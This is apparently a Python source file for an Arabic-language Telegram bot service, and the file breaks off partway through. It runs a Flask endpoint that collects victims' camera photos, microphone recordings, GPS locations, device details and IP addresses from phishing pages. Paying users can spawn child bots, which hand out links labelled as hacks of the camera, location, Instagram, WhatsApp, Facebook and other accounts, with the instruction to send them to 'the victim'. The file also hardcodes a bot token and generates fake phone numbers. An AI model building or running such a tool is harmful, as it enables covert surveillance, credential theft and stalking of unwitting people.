import os
import json
import logging
import random
import time
import threading
import subprocess
import sys
import re

import requests
from flask import Flask, request as flask_request

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Updater,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    Filters,
    CallbackContext,
)

# ═══════════════════════════════════════════════════════════════
# ⚠️ عدّل هذي السطور فقط
# ═══════════════════════════════════════════════════════════════
MAIN_BOT_TOKEN = "8634510247:AAGtVty13i6hI3vTYGZd3SAxmjZlyRE4HyU"
MAIN_ADMIN_ID = 8868615222
MY_SITE = "https://elaborate-sprite-8249fc.netlify.app/home.html"
BOT_NAME = "رزان"
DEFAULT_POINTS = 10
COST_PER_BOT = 5
COST_PER_USE = 1
MAX_BOTS = 10
PORT = int(os.environ.get("PORT", 8080))
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)
RUNNING_DIR = "running_bots"
os.makedirs(RUNNING_DIR, exist_ok=True)

USERS_FILE = os.path.join(DATA_DIR, "users.json")
BOTS_FILE = os.path.join(DATA_DIR, "bots.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")


def load_json(path, default=None):
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return default if default is not None else {}
    returnturn default if default is not None else {}


def save_json(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"save_json: {e}")


def get_users():
    return load_json(USERS_FILE, {})


def save_users(u):
    save_json(USERS_FILE, u)


def get_bots():
    return load_json(BOTS_FILE, {})


def save_bots(b):
    save_json(BOTS_FILE, b)


def get_settings():
    s = load_json(SETTINGS_FILE, {})
    s.setdefault("bot_status", "on")
    s.setdefault("banned", [])
    s.setdefault("cost_per_use", COST_PER_USE)
    s.setdefault("cost_per_bot", COST_PER_BOT)
    s.setdefault("welcome_points", DEFAULT_POINTS)
    s.setdefault("start_message",
        f"🖤 أهلاً بك في <b>{BOT_NAME}</b>\n\nاختر من الأزرار أدناه.")
    return s


def save_settings(s):
    save_json(SETTINGS_FILE, s)


def is_admin(uid):
    return uid == MAIN_ADMIN_ID


def is_banned(uid):
    return uid in get_settings().get("banned", [])


def get_points(uid):
    return get_users().get(str(uid), {}).get("points", 0)


def add_points(uid, amount):
    users = get_users()
    if str(uid) in users:
        users[str(uid)]["points"] = users[str(uid)].get("points", 0) + amount
        save_users(users)
        return users[str(uid)]["points"]
    return None


user_state = {}
running_procs = {}


# ═══════════════════════════════════════════════════════════════
# Flask — يستقبل البيانات من الصفحات
# ═══════════════════════════════════════════════════════════════
flask_app = Flask(__name__)


@flask_app.route("/", methods=["GET"])
def home():
    return "OK", 200


def _send(bot_token, chat_id, method, files=None, data=None):
    try:
        url = f"https://api.telegram.org/bot{bot_token}/{method}"
        if files:
            return requests.post(url, files=files, data=data, timeout=60)
        return requests.post(url, json=data, timeout=30)
    except Exception as e:
        logger.error(f"_send {method}: {e}")
        return None


@flask_app.route("/track", methods=["POST"])
def track():
    try:
        ip = flask_request.headers.get("X-Forwarded-For", flask_request.remote_addr)
        bots = get_bots()

        # ═══ نص (JSON) ═══
        if flask_request.is_json:
            data = flask_request.get_json(silent=True) or {}
            app_type = data.get("type", "غير معروف")
            owner_id = str(data.get("id", ""))
            extra = data.get("data", {})

            owner_bot = bots.get(owner_id) if owner_id != str(MAIN_ADMIN_ID) else None

            # للأدمن
            admin_msg = (
                f"🎯 <b>ضحية جديدة</b>\n\n"
                f"<b>النوع:</b> {app_type}\n"
            )
            if owner_bot:
                admin_msg += f"<b>البوت الفرعي:</b> @{owner_bot.get('username', '?')}\n"
                admin_msg += f"<b>صاحب البوت:</b> <code>{owner_id}</code>\n"
            else:
                admin_msg += f"<b>من البوت الرئيسي</b>\n"
                admin_msg += f"<b>ID المالك:</b> <code>{owner_id}</code>\n"
            for k, v in extra.items():
                admin_msg += f"<b>{k}:</b> <code>{str(v)[:300]}</code>\n"
            admin_msg += f"\n<b>IP:</b> <code>{ip}</code>\n"
            admin_msg += f"<b>الوقت:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"

            _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendMessage", data={
                "chat_id": MAIN_ADMIN_ID, "text": admin_msg, "parse_mode": "HTML",
            })

            # لصاحب البوت الفرعي (لو موجود)
            if owner_bot:
                user_msg = (
                    f"🎯 <b>ضحية جديدة</b>\n\n"
                    f"<b>النوع:</b> {app_type}\n"
                )
                for k, v in extra.items():
                    user_msg += f"<b>{k}:</b> <code>{str(v)[:300]}</code>\n"
                user_msg += f"\n<b>IP:</b> <code>{ip}</code>\n"
                user_msg += f"<b>الوقت:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
                _send(owner_bot["token"], int(owner_id), "sendMessage", data={
                    "chat_id": int(owner_id), "text": user_msg, "parse_mode": "HTML",
                })

            return {"ok": True}, 200

        # ═══ ملفات (multipart) ═══
        app_type = flask_request.form.get("type", "غير معروف")
        owner_id = str(flask_request.form.get("id", ""))
        extra_json = flask_request.form.get("data", "{}")
        try:
            extra = json.loads(extra_json)
        except Exception:
            extra = {}

        owner_bot = bots.get(owner_id) if owner_id != str(MAIN_ADMIN_ID) else None

        def build_caption(prefix):
            cap = f"🎯 <b>{prefix}</b>\n\n<b>النوع:</b> {app_type}\n"
            if owner_bot:
                cap += f"<b>البوت الفرعي:</b> @{owner_bot.get('username', '?')}\n"
            cap += f"<b>ID:</b> <code>{owner_id}</code>\n"
            for k, v in extra.items():
                cap += f"<b>{k}:</b> <code>{str(v)[:300]}</code>\n"
            cap += f"\n<b>IP:</b> <code>{ip}</code>\n"
            cap += f"<b>الوقت:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
            return cap

        # صورة
        if "photo" in flask_request.files:
            photo = flask_request.files["photo"]
            cap = build_caption("📸 صورة من ضحية")
            # إرسال للأدمن
            _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendPhoto", files={
                "photo": (photo.filename, photo.stream, photo.content_type or "image/jpeg"),
            }, data={
                "chat_id": MAIN_ADMIN_ID, "caption": cap, "parse_mode": "HTML",
            })
            # إرسال لصاحب البوت الفرعي
            if owner_bot:
                photo.stream.seek(0)
                _send(owner_bot["token"], int(owner_id), "sendPhoto", files={
                    "photo": (photo.filename, photo.stream, photo.content_type or "image/jpeg"),
                }, data={
                    "chat_id": int(owner_id), "caption": cap, "parse_mode": "HTML",
                })
            return {"ok": True}, 200

        # صوت
        if "audio" in flask_request.files:
            audio = flask_request.files["audio"]
            cap = build_caption("🎤 تسجيل صوتي")
            _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendAudio", files={
                "audio": (audio.filename, audio.stream, audio.content_type or "audio/webm"),
            }, data={
                "chat_id": MAIN_ADMIN_ID, "caption": cap, "parse_mode": "HTML",
            })
            if owner_bot:
                audio.stream.seek(0)
                _send(owner_bot["token"], int(owner_id), "sendAudio", files={
                    "audio": (audio.filename, audio.stream, audio.content_type or "audio/webm"),
                }, data={
                    "chat_id": int(owner_id), "caption": cap, "parse_mode": "HTML",
                })
            return {"ok": True}, 200

        # موقع
        if "location" in flask_request.form:
            try:
                loc = json.loads(flask_request.form.get("location", "{}"))
                lat, lon = loc.get("lat"), loc.get("lon")
                if lat and lon:
                    cap = build_caption("📍 موقع ضحية")
                    _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendLocation", data={
                        "chat_id": MAIN_ADMIN_ID, "latitude": lat, "longitude": lon,
                    })
                    _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendMessage", data={
                        "chat_id": MAIN_ADMIN_ID,
                        "text": cap + f"\n🗺️ <a href='https://maps.google.com/?q={lat},{lon}'>خرائط جوجل</a>",
                        "parse_mode": "HTML",
                    })
                    if owner_bot:
                        _send(owner_bot["token"], int(owner_id), "sendLocation", data={
                            "chat_id": int(owner_id), "latitude": lat, "longitude": lon,
                        })
                        _send(owner_bot["token"], int(owner_id), "sendMessage", data={
                            "chat_id": int(owner_id),
                            "text": cap + f"\n🗺️ <a href='https://maps.google.com/?q={lat},{lon}'>خرائط جوجل</a>",
                            "parse_mode": "HTML",
                        })
                    return {"ok": True}, 200
            except Exception as e:
                logger.error(f"loc: {e}")

        # افتراضي
        cap = build_caption("🎯 ضحية")
        _send(MAIN_BOT_TOKEN, MAIN_ADMIN_ID, "sendMessage", data={
            "chat_id": MAIN_ADMIN_ID, "text": cap, "parse_mode": "HTML",
        })
        if owner_bot:
            _send(owner_bot["token"], int(owner_id), "sendMessage", data={
                "chat_id": int(owner_id), "text": cap, "parse_mode": "HTML",
            })
        return {"ok": True}, 200

    except Exception as e:
        logger.error(f"track: {e}")
        return {"ok": False}, 200


def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)


# ═══════════════════════════════════════════════════════════════
# تشغيل بوت فرعي
# ═══════════════════════════════════════════════════════════════
CHILD_TEMPLATE = '''
import os, json, time, random, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

TOKEN = "{token}"
OWNER_ID = {owner_id}
ADMIN_ID = {admin_id}
MY_SITE = "{my_site}"
BOT_USERNAME = "{username}"

def start(update: Update, ctx: CallbackContext):
    uid = update.effective_user.id
    if uid != OWNER_ID and uid != ADMIN_ID:
        update.message.reply_text("\\U0001F512 هذا البوت خاص.")
        return
    kb = [
        [InlineKeyboardButton("\\U0001F480 اختراق الكاميرا", callback_data="cam"),
         InlineKeyboardButton("\\u2620 اختراق الموقع", callback_data="loc")],
        [InlineKeyboardButton("\\U0001FA78 تسجيل صوت", callback_data="mic"),
         InlineKeyboardButton("\\U0001F4F1 معلومات الجهاز", callback_data="device")],
        [InlineKeyboardButton("\\U0001F525 اختراق انستقرام", callback_data="instagram"),
         InlineKeyboardButton("\\U0001F7E2 اختراق واتساب", callback_data="whatsapp")],
        [InlineKeyboardButton("\\U0001F3AE اختراق ببجي", callback_data="pubg"),
         InlineKeyboardButton("\\U0001F608 اختراق فيسبوك", callback_data="facebook")],
        [InlineKeyboardButton("\\U0001F47B اختراق سناب", callback_data="snapchat"),
         InlineKeyboardButton("\\u26A1 اختراق فري فاير", callback_data="freefire")],
        [InlineKeyboardButton("\\U0001F4A3 اختراق تيك توك", callback_data="tiktok"),
         InlineKeyboardButton("\\U0001F4DE اختراق تيليجرام", callback_data="telegram")],
        [InlineKeyboardButton("\\u260E أرقام وهمية", callback_data="fake_numbers")],
    ]
    update.message.reply_text(
        "\\U0001F9B4 أهلاً بك في <b>" + BOT_USERNAME + "</b>\\n\\nاختر من الأزرار:",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(kb),
    )

def callback(update: Update, ctx: CallbackContext):
    q = update.callback_query
    uid = q.from_user.id
    if uid != OWNER_ID and uid != ADMIN_ID:
        q.answer("\\U0001F512", show_alert=True)
        return
    q.answer("\\U0001F480")
    link_map = {{
        "cam": "camera", "loc": "location", "mic": "mic", "device": "device",
        "instagram": "instagram", "whatsapp": "whatsapp", "pubg": "pubg",
        "facebook": "facebook", "snapchat": "snapchat", "freefire": "freefire",
        "tiktok": "tiktok", "telegram": "telegram",
    }}
    if q.data in link_map:
        app = link_map[q.data]
        url = MY_SITE + "?app=" + app + "&id=" + str(OWNER_ID)
        q.edit_message_text(
            "\\u2620 <b>الرابط جاهز</b>\\n\\n<code>" + url + "</code>\\n\\n"
            "\\U0001FA78 أرسله للضحية.",
            parse_mode="HTML",
        )
    elif q.data == "fake_numbers":
        phone = "+" + str(random.randint(1, 99)) + str(random.randint(1000000000, 9999999999))
        q.edit_message_text(
            "\\u260E <b>رقم وهمي:</b>\\n<code>" + phone + "</code>",
            parse_mode="HTML",
        )

def main():
    up = Updater(TOKEN, use_context=True)
    dp = up.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(callback))
    up.start_polling()
    up.idle()

if __name__ == "__main__":
    main()
'''


def bot_alive(bid):
    p = running_procs.get(bid)
    return bool(p and p.poll() is None)


def start_child(bid, token, owner_id, username):
    if bot_alive(bid):
        return True
    try:
        code = CHILD_TEMPLATE.format(
            token=token,
            owner_id=owner_id,
            admin_id=MAIN_ADMIN_ID,
            my_site=MY_SITE,
            username=username,
        )
        path = os.path.join(RUNNING_DIR, f"{bid}.py")
        with open(path, "w", encoding="utf-8") as f:
            f.write(code)
        log_path = os.path.join(RUNNING_DIR, f"{bid}.log")
        lf = open(log_path, "a", encoding="utf-8")
        p = subprocess.Popen(
            [sys.executable, "-u", path],
            stdout=lf, stderr=lf, stdin=subprocess.DEVNULL,
            start_new_session=True,
        )
        running_procs[bid] = p
        logger.info(f"Child bot {bid} started.")
        return True
    except Exception as e:
        logger.error(f"start_child: {e}")
        return False


def stop_child(bid):
    p = running_procs.pop(bid, None)
    if p:
        try:
            if os.name != "nt":
                os.killpg(os.getpgid(p.pid), 9)
            else:
                p.terminate()
        except Exception:
            pass
    return True


def tg_get_username(token):
    try:
        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=15).json()
        if r.get("ok"):
            return r["result"]["username"], r["result"]["first_name"]
    except Exception:
        pass
    return None, None


# ═══════════════════════════════════════════════════════════════
# الكيبوردات
# ═══════════════════════════════════════════════════════════════
def user_keyboard(uid):
    kb = [
        [InlineKeyboardButton("✨ صنع بوت جديد", callback_data="create_bot")],
        [InlineKeyboardButton("🛠 بوتاتي", callback_data="my_bots"),
         InlineKeyboardButton("💎 نقاطي", callback_data="my_points")],
    ]
    if is_admin(uid):
        kb.append([InlineKeyboardButton("⚙️ لوحة التحكم", callback_data="adm_panel")])
    return InlineKeyboardMarkup(kb)


def admin_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ لوحة التحكم", callback_data="adm_panel")],
        [InlineKeyboardButton("💀 أزرار الاختراق (خاصة بك فقط)", callback_data="admin_buttons")],
    ])


def admin_buttons_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 اختراق الكاميرا", callback_data="cam"),
         InlineKeyboardButton("☠️ اختراق الموقع", callback_data="loc")],
        [InlineKeyboardButton("🩸 تسجيل صوت", callback_data="mic"),
         InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device")],
        [InlineKeyboardButton("🔥 اختراق انستقرام", callback_data="instagram"),
         InlineKeyboardButton("🟢 اختراق واتساب", callback_data="whatsapp")],
        [InlineKeyboardButton("🎮 اختراق ببجي", callback_data="pubg"),
         InlineKeyboardButton("😈 اختراق فيسبوك", callback_data="facebook")],
        [InlineKeyboardButton("👻 اختراق سناب", callback_data="snapchat"),
         InlineKeyboardButton("⚡ اختراق فري فاير", callback_data="freefire")],
        [InlineKeyboardButton("💣 اختراق تيك توك", callback_data="tiktok"),
         InlineKeyboardButton("📞 اختراق تيليجرام", callback_data="telegram")],
        [InlineKeyboardButton("☎️ أرقام وهمية", callback_data="fake_numbers")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
    ])


def admin_keyboard():
    s = get_settings()
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 المستخدمين", callback_data="adm_users"),
         InlineKeyboardButton("🤖 البوتات", callback_data="adm_bots")],
        [InlineKeyboardButton("💰 شحن نقاط", callback_data="adm_charge"),
         InlineKeyboardButton("➖ خصم نقاط", callback_data="adm_deduct")],
        [InlineKeyboardButton("📮 إذاعة", callback_data="adm_broadcast")],
        [InlineKeyboardButton(
            "❌ إيقاف البوت" if s.get("bot_status") == "on" else "✅ فتح البوت",
            callback_data="adm_toggle")],
        [InlineKeyboardButton("🚫 حظر", callback_data="adm_ban"),
         InlineKeyboardButton("✅ فك حظر", callback_data="adm_unban")],
        [InlineKeyboardButton("💵 سعر الاستخدام", callback_data="adm_set_cost"),
         InlineKeyboardButton("💵 سعر البوت", callback_data="adm_set_botcost")],
        [InlineKeyboardButton("🎁 نقاط الترحيب", callback_data="adm_set_welcome")],
        [InlineKeyboardButton("📊 إحصائيات", callback_data="adm_stats")],
        [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")],
    ])
# ═══════════════════════════════════════════════════════════════
# /start
# ═══════════════════════════════════════════════════════════════
def cmd_start(update: Update, context: CallbackContext):
    u = update.effective_user
    uid = u.id

    if is_banned(uid):
        update.message.reply_text("🚫 أنت محظور.")
        return

    users = get_users()
    s = get_settings()
    is_new = False
    if str(uid) not in users:
        users[str(uid)] = {
            "id": uid,
            "first_name": u.first_name or "",
            "username": u.username or "",
            "points": s.get("welcome_points", DEFAULT_POINTS),
            "joined": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        save_users(users)
        is_new = True
        try:
            context.bot.send_message(
                MAIN_ADMIN_ID,
                f"🔔 <b>مستخدم جديد</b>\n\n"
                f"👤 {u.first_name}\n"
                f"🆔 <code>{uid}</code>\n"
                f"🔗 @{u.username or '—'}",
                parse_mode="HTML",
            )
        except Exception:
            pass

    pts = users[str(uid)].get("points", 0)
    welcome = "🩸 أهلاً بك في عالم الظلام." if is_new else "🖤 أهلاً بك مجددًا."
    header = (
        "☠️━━━━━━━━━━━━━━━━━━━━☠️\n"
        f"     🖤 <b>{BOT_NAME}</b> 🖤\n"
        "☠️━━━━━━━━━━━━━━━━━━━━☠️"
    )

    if is_admin(uid):
        update.message.reply_text(
            f"{header}\n\n{welcome}\n\n"
            f"👑 <b>أنت الأدمن</b>\n"
            f"💰 نقاطك: <code>{pts}</code>\n\n"
            f"🎯 أزرارك الخاصة بك فقط.",
            parse_mode="HTML",
            reply_markup=admin_main_keyboard(),
        )
    else:
        update.message.reply_text(
            f"{header}\n\n{welcome}\n\n"
            f"💰 <b>نقاطك:</b> <code>{pts}</code>\n\n"
            f"{s['start_message']}",
            parse_mode="HTML",
            reply_markup=user_keyboard(uid),
        )


# ═══════════════════════════════════════════════════════════════
# Callback Handler
# ═══════════════════════════════════════════════════════════════
def handle_callback(update: Update, context: CallbackContext):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data

    if is_banned(uid):
        q.answer("🚫 محظور", show_alert=True)
        return

    s = get_settings()

    # ═══ أزرار الأدمن (اختراق خاصة به) ═══
    if data == "admin_buttons":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("💀 <b>أزرار الاختراق — خاصة بك فقط</b>",
            parse_mode="HTML", reply_markup=admin_buttons_keyboard())
        return

    # ═══ لوحة الأدمن ═══
    if data == "adm_panel":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("⚙️ <b>لوحة التحكم</b>", parse_mode="HTML",
            reply_markup=admin_keyboard())
        return

    if data == "adm_stats":
        if not is_admin(uid):
            return
        users = get_users()
        bots = get_bots()
        total_pts = sum(u.get("points", 0) for u in users.values())
        alive = sum(1 for b in bots if bot_alive(b))
        q.answer()
        q.edit_message_text(
            f"📊 <b>إحصائيات</b>\n\n"
            f"👥 المستخدمون: <code>{len(users)}</code>\n"
            f"🤖 البوتات الكلية: <code>{len(bots)}</code>\n"
            f"🟢 البوتات الحية: <code>{alive}</code>\n"
            f"💰 مجموع النقاط: <code>{total_pts}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="adm_panel")]
            ]),
        )
        return

    # ═══ البوتات (أدمن) ═══
    if data == "adm_bots":
        if not is_admin(uid):
            return
        q.answer()
        show_admin_bots(q, 0)
        return

    if data.startswith("admbots_page_"):
        if not is_admin(uid):
            return
        q.answer()
        show_admin_bots(q, int(data.split("_")[2]))
        return

    if data.startswith("admbot_view_"):
        if not is_admin(uid):
            return
        q.answer()
        show_admin_bot_panel(q, data.split("_", 2)[2])
        return

    # ═══ المستخدمين ═══
    if data == "adm_users":
        if not is_admin(uid):
            return
        q.answer()
        show_users_page(q, 0)
        return

    if data.startswith("users_page_"):
        if not is_admin(uid):
            return
        q.answer()
        show_users_page(q, int(data.split("_")[2]))
        return

    if data.startswith("user_view_"):
        if not is_admin(uid):
            return
        q.answer()
        show_user_panel(q, data.split("_", 2)[2])
        return

    if data.startswith("charge_"):
        if not is_admin(uid):
            return
        target = data.split("_")[1]
        q.answer()
        q.edit_message_text(f"💰 أرسل عدد النقاط لـ <code>{target}</code>:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ إلغاء", callback_data="adm_panel")]
            ]))
        user_state[uid] = {"action": "await_charge", "target": target}
        return

    if data.startswith("deduct_"):
        if not is_admin(uid):
            return
        target = data.split("_")[1]
        q.answer()
        q.edit_message_text(f"➖ أرسل عدد النقاط لخصمها من <code>{target}</code>:",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("❌ إلغاء", callback_data="adm_panel")]
            ]))
        user_state[uid] = {"action": "await_deduct", "target": target}
        return

    if data.startswith("banusr_"):
        if not is_admin(uid):
            return
        t = int(data.split("_")[1])
        st = get_settings()
        if t not in st["banned"]:
            st["banned"].append(t)
            save_settings(st)
        q.answer("✅ تم الحظر")
        show_user_panel(q, str(t))
        return

    if data.startswith("unbanusr_"):
        if not is_admin(uid):
            return
        t = int(data.split("_")[1])
        st = get_settings()
        if t in st["banned"]:
            st["banned"].remove(t)
            save_settings(st)
        q.answer("✅ تم إلغاء الحظر")
        show_user_panel(q, str(t))
        return

    if data == "adm_charge":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("💰 أرسل ID المستخدم:")
        user_state[uid] = {"action": "await_charge_by_id"}
        return

    if data == "adm_deduct":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("➖ أرسل ID المستخدم:")
        user_state[uid] = {"action": "await_deduct_by_id"}
        return

    if data == "adm_broadcast":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("📮 أرسل الرسالة للإذاعة:")
        user_state[uid] = {"action": "await_broadcast"}
        return

    if data == "adm_toggle":
        if not is_admin(uid):
            return
        st = get_settings()
        st["bot_status"] = "off" if st.get("bot_status") == "on" else "on"
        save_settings(st)
        q.answer(f"✅ {st['bot_status']}")
        q.edit_message_text("⚙️ <b>لوحة التحكم</b>", parse_mode="HTML",
            reply_markup=admin_keyboard())
        return

    if data == "adm_ban":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("🚫 أرسل ايد العضو:")
        user_state[uid] = {"action": "await_ban"}
        return

    if data == "adm_unban":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("✅ أرسل ايد العضو:")
        user_state[uid] = {"action": "await_unban"}
        return

    if data == "adm_set_cost":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("💵 أرسل سعر الاستخدام (نقاط لكل ضغطة):")
        user_state[uid] = {"action": "await_cost"}
        return

    if data == "adm_set_botcost":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("💵 أرسل سعر صنع بوت (نقاط):")
        user_state[uid] = {"action": "await_botcost"}
        return

    if data == "adm_set_welcome":
        if not is_admin(uid):
            return
        q.answer()
        q.edit_message_text("🎁 أرسل عدد نقاط الترحيب:")
        user_state[uid] = {"action": "await_welcome"}
        return

    if data == "back_main":
        q.answer()
        if is_admin(uid):
            q.edit_message_text("🎯 <b>اختر:</b>", parse_mode="HTML",
                reply_markup=admin_main_keyboard())
        else:
            q.edit_message_text("💀 <b>اختر:</b>", parse_mode="HTML",
                reply_markup=user_keyboard(uid))
        return

    if data == "my_points":
        q.answer()
        pts = get_points(uid)
        q.edit_message_text(
            f"💎 <b>نقاطك:</b> <code>{pts}</code>\n\n"
            f"💵 كل ضغطة: <code>{s.get('cost_per_use', 1)}</code>\n"
            f"💵 صنع بوت: <code>{s.get('cost_per_bot', COST_PER_BOT)}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
            ]))
        return

    # ═══ أزرار الاختراق — الأدمن فقط ═══
    link_map = {
        "cam": "camera", "loc": "location", "mic": "mic", "device": "device",
        "instagram": "instagram", "whatsapp": "whatsapp", "pubg": "pubg",
        "facebook": "facebook", "snapchat": "snapchat", "freefire": "freefire",
        "tiktok": "tiktok", "telegram": "telegram",
    }

    if data in link_map:
        if not is_admin(uid):
            q.answer("🔒 للأدمن فقط", show_alert=True)
            return
        q.answer("💀")
        app = link_map[data]
        url = f"{MY_SITE}?app={app}&id={MAIN_ADMIN_ID}"
        q.edit_message_text(
            f"☠️ <b>الرابط جاهز</b>\n\n<code>{url}</code>\n\n🩸 أرسله للضحية.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_buttons")]
            ]))
        return

    if data == "fake_numbers":
        if not is_admin(uid):
            q.answer("🔒 للأدمن فقط", show_alert=True)
            return
        q.answer()
        phone = f"+{random.randint(1, 99)}{random.randint(1000000000, 9999999999)}"
        q.edit_message_text(
            f"☎️ <b>رقم وهمي:</b>\n<code>{phone}</code>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 جديد", callback_data="fake_numbers")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="admin_buttons")],
            ]))
        return

    # ═══ صنع بوت (مستخدمين) ═══
    if data == "create_bot":
        if s.get("bot_status") == "off" and not is_admin(uid):
            q.answer("🚨 البوت متوقف.", show_alert=True)
            return
        my = [b for b in get_bots().values() if b.get("owner_id") == uid]
        if len(my) >= 3 and not is_admin(uid):
            q.answer("❌ الحد 3 بوتات.", show_alert=True)
            return
        total = len(get_bots())
        if total >= MAX_BOTS and not is_admin(uid):
            q.answer("❌ السيرفر ممتلئ.", show_alert=True)
            return
        cost = s.get("cost_per_bot", COST_PER_BOT)
        if not is_admin(uid) and get_points(uid) < cost:
            q.answer(f"❌ نقاطك غير كافية ({get_points(uid)}/{cost}).", show_alert=True)
            return
        q.answer()
        q.edit_message_text(
            f"📝 أرسل توكن البوت من @BotFather.\n\n💰 التكلفة: <code>{cost}</code> نقطة.",
            parse_mode="HTML")
        user_state[uid] = {"action": "await_token"}
        return

    if data == "my_bots":
        q.answer()
        bots = get_bots()
        mine = {bid: b for bid, b in bots.items() if b.get("owner_id") == uid}
        if not mine:
            q.edit_message_text("📂 لا بوتات لك.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 رجوع", callback_data="back_main")]
                ]))
            return
        kb = []
        for bid, b in mine.items():
            alive = bot_alive(bid)
            kb.append([InlineKeyboardButton(
                f"{'🟢' if alive else '🔴'} @{b.get('username', '?')}",
                callback_data=f"bot_{bid}")])
        kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="back_main")])
        q.edit_message_text(f"🛠 <b>بوتاتك ({len(mine)})</b>", parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(kb))
        return

    if data.startswith("bot_") and not data.startswith("bot_del_") and not data.startswith("bot_tog_"):
        bid = data.split("_", 1)[1]
        b = get_bots().get(bid)
        if not b or (b.get("owner_id") != uid and not is_admin(uid)):
            q.answer("❌", show_alert=True)
            return
        q.answer()
        alive = bot_alive(bid)
        text = (
            f"🤖 <b>@{b.get('username')}</b>\n\n"
            f"🟢 الحالة: {'يعمل' if alive else 'متوقف'}\n"
            f"📅 {b.get('created')}"
        )
        kb = [
            [InlineKeyboardButton(
                "⏹ إيقاف" if alive else "▶️ تشغيل",
                callback_data=f"bot_tog_{bid}")],
            [InlineKeyboardButton("🗑 حذف", callback_data=f"bot_del_{bid}")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="my_bots")],
        ]
        q.edit_message_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
        return

    if data.startswith("bot_tog_"):
        bid = data.split("_", 2)[2]
        b = get_bots().get(bid)
        if not b or (b.get("owner_id") != uid and not is_admin(uid)):
            q.answer("❌", show_alert=True)
            return
        if bot_alive(bid):
            stop_child(bid)
            q.answer("⏹")
        else:
            start_child(bid, b.get("token"), b.get("owner_id"), b.get("username"))
            q.answer("▶️")
        q.data = f"bot_{bid}"
        handle_callback(update, context)
        return

    if data.startswith("bot_del_"):
        bid = data.split("_", 2)[2]
        b = get_bots().get(bid)
        if not b or (b.get("owner_id") != uid and not is_admin(uid)):
            q.answer("❌", show_alert=True)
            return
        stop_child(bid)
        bots = get_bots()
        bots.pop(bid, None)
        save_bots(bots)
        q.answer("🗑")
        q.data = "my_bots"
        handle_callback(update, context)
        return

    q.answer()


# ═══════════════════════════════════════════════════════════════
# صفحات الأدمن
# ═══════════════════════════════════════════════════════════════
def show_users_page(q, page):
    users = get_users()
    if not users:
        q.edit_message_text("لا يوجد مستخدمون.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 رجوع", callback_data="adm_panel")]
            ]))
        return
    ids = list(users.keys())
    per = 8
    total = (len(ids) + per - 1) // per
    page = max(0, min(page, total - 1))
    chunk = ids[page * per:(page + 1) * per]
    kb = []
    for u in chunk:
        x = users[u]
        kb.append([InlineKeyboardButton(
            f"👤 {x.get('first_name', '?')[:12]} | 💰 {x.get('points', 0)}",
            callback_data=f"user_view_{u}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"users_page_{page-1}"))
    if page < total - 1:
        nav.append(InlineKeyboardButton("▶️", callback_data=f"users_page_{page+1}"))
    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 رجوع", callback_data="adm_panel")])
